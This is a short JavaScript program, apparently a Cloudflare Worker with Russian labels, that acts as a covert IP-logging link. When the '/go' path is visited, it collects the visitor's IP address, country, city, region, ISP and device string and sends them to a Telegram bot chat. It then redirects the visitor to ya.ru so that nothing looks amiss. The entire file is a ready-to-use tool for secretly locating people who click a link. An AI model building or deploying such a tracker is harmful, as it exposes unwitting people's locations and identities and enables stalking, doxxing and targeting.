export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === "/go") {
      const ip = request.headers.get("CF-Connecting-IP") || "неизвестно";
      const ua = request.headers.get("User-Agent") || "неизвестно";
      const country = request.headers.get("CF-IPCountry") || "неизвестно";
      const city = request.cf?.city || "неизвестно";
      const region = request.cf?.region || "неизвестно";
      const org = request.cf?.asOrganization || "неизвестно";

      const text =
        `🔔 Переход по ссылке\n` +
        `IP: ${ip}\n` +
        `Страна: ${country}\n` +
        `Город: ${city}\n` +
        `Регион: ${region}\n` +
        `Провайдер: ${org}\n` +
        `Устройство: ${ua}`;

      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: env.CHAT_ID, text })
      });

      return Response.redirect("https://ya.ru", 302);
    }

    return new Response("ok");
  }
};
